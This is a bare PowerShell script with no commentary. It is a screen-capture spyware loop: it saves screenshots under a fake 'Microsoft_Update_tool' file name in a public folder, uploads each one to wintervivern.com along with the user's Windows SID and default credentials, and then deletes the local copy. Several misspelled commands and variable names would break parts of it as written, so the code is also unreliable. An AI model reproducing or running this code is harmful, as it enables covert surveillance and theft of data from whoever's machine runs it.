[Reflection.Assembly]::LoadWithPartialName('System.Drawing');
 function screenshot([Drawing.Rectangle]$bounds, $path) 
 {
 $bmp = New-Object Drawing.Bitmap $bound.width, $bound.height;
 $graphics = [Drawing.Graphics]::FromImage($bmp);
 $graphics.CopyFromScreen($bound.Location, [Drawing.Point]::Empty, $bound.size);
 $bmp.Save($path);
 $graphics.Dispose();
 $bmp.Dispose()
 };
 $bounds = [Drawing.Rectangle]::FromLTRB(0,0,1900,1080);
 function downloadFileUP($f){$name=$f.repalce(':\','').replace('\','/');
 $valu=([System.Security.Principal.WindosIdentity]::GetCurrent()).User.Value;
 $vu=$valu+$name;
 Invoke-RestMethod -Uri 'https://wintervivern.com/screenshot.php' -Method Post -InFile $f -Headers@{'filename=$vu'} -UseDefaultCredentials};
 $i=0;
 while($true)
 {
 $i=$i+1;$f='c:\Users\Public\MicrosoftUpdateClient\Microsoft_Update_tool_'+$i+'.dat';
 screenshot $bounds $f;
 sleep 1;
 downloadFileUP($f);
 sleep 9;
 remote-Item $f -Force
 }
